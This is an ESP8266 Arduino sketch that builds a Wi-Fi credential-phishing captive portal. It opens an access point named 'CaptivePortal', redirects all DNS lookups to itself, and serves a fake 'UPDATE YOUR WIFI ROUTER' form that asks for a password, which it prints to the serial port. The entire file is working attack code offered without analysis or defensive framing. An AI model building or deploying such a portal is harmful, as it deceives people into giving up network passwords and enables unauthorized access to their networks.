#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

const char MAIN_page[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body>
<h3> UPDATE YOUR WIFI ROUTER</h3>
<form action="/update">
  Please Authorize to continue:<br>
  <input type="password" name="passwd" placeholder="PASSWORD">
  <br>
  <input type="submit" value="Submit">
</form> 

</body>
</html>
)=====";


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer server(80); 

//ip on browser routine
void handleRoot() {
 String s = MAIN_page; //Read HTML contents
 server.send(200, "text/html", s); //Send web page
}
//submit button routine 
void handleForm() {
 String passwd = server.arg("passwd"); 
 Serial.print("Password:");
 Serial.println(passwd); 
 //String s = "<a href='/'> Go Back </a>";
 //server.send(200, "text/html", s); //Send web page
}
//SETUP
void setup(void){
  Serial.begin(9600);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("CaptivePortal");  
  Serial.println("");

  dnsServer.start(DNS_PORT, "*", apIP);
  server.on("/", handleRoot);
  server.on("/update", handleForm);
  server.onNotFound(handleRoot);
  server.begin();                  
  Serial.println("HTTP server started");
}

void loop(void){
  dnsServer.processNextRequest();
  server.handleClient();          //Handle client requests
}
